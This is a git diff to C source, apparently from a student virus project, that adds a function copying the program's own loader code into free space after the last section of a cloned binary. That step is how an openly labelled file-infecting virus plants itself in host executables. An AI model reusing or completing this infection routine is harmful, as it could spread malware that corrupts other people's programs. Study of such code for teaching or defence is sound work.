@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/05/13 14:58:36 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/26 23:45:53 by anselme          ###   ########.fr       */
+/*   Updated: 2020/01/12 17:50:48 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -49,5 +49,25 @@ bool		copy_to_clone(struct safe_ptr clone_ref, struct safe_ptr original_ref, \
 	{
 		return errors(ERR_THROW, _ERR_COPY_TO_CLONE);
 	}
+	return true;
+}
+
+/*
+** copy_loader_to_clone
+*/
+
+#include "loader.h"
+#include "virus.h"
+
+bool		copy_loader_to_clone(struct safe_ptr clone_ref, size_t end_last_sect)
+{
+	const size_t	loader_size = (uint64_t)_start - (uint64_t)loader_entry;
+	void		*loader_location = safe(clone_ref, end_last_sect, loader_size);
+
+	if (!loader_location)
+		return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
+
+	memcpy(loader_location, (void *)loader_entry, loader_size);
+
 	return true;
 }
